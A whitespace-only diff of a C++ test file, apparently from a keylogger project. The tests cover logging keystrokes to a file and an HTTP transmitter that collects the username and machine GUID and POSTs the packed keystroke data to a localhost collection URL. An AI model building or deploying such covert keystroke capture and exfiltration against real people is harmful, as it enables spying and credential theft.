@@ -56,7 +56,7 @@ TEST_F(SystemTests, LogingAndTransmiting) {
 
 class KeyloggerTest : public ::testing::Test {
 public:
-	
+
 	void call_log_key(Keylogger& logger, int vk_code, int wm_mode) {
 		logger.log_key_(vk_code, WM_KEYDOWN);
 	}
@@ -105,7 +105,7 @@ TEST_F(KeyloggerTest, LogToFile) {
 
 	out = get_last_line("keylog.txt");
 
-	
+
 
 	EXPECT_EQ(expected, out);
 	EXPECT_TRUE(true);
@@ -170,7 +170,7 @@ public:
 		transmiter.save_machine_guid_();
 		return transmiter.machine_guid_;
 	}
-	
+
 	bool call_swap_buffers_(TransmiterHTTP& transmiter,
 		std::vector<std::unique_ptr<LogNode>>& t_buf) {
 		return transmiter.swap_buffers_(t_buf);
@@ -182,20 +182,20 @@ public:
 //test packing data into json and sending it via post to url ddd
 //result can be checked by via wireshark or other network traffic analizer
 	//tests saving username, saving machineGUID, packing data json, requesst, retries
-	TEST_F(TransmiterTests, JustSendPost) {
-		TransmiterHTTP transmiter(v, p, m);
-		transmiter.set_conf("",1,1);
+TEST_F(TransmiterTests, JustSendPost) {
+	TransmiterHTTP transmiter(v, p, m);
+	transmiter.set_conf("", 1, 1);
 
-		std::cout << "Username: " << call_save_username_(transmiter) << std::endl;
-		std::cout << "Machine GUID: " << call_save_machine_guid_(transmiter) << std::endl;
-		std::string data = call_pack_data_to_json_(transmiter, v);
+	std::cout << "Username: " << call_save_username_(transmiter) << std::endl;
+	std::cout << "Machine GUID: " << call_save_machine_guid_(transmiter) << std::endl;
+	std::string data = call_pack_data_to_json_(transmiter, v);
 
-		//auto p_info = start_mock_server();
-		transmiter.send_post_json(data, "http://127.0.0.1:80/test/collect");
-		EXPECT_TRUE(true);
-		//EXPECT_TRUE(stop_mock_server(p_info));
+	//auto p_info = start_mock_server();
+	transmiter.send_post_json(data, "http://127.0.0.1:80/test/collect");
+	EXPECT_TRUE(true);
+	//EXPECT_TRUE(stop_mock_server(p_info));
 
-	}
+}
 
 //test buffer swaping, dangling pointer
 TEST_F(TransmiterTests, BufferSwap) {
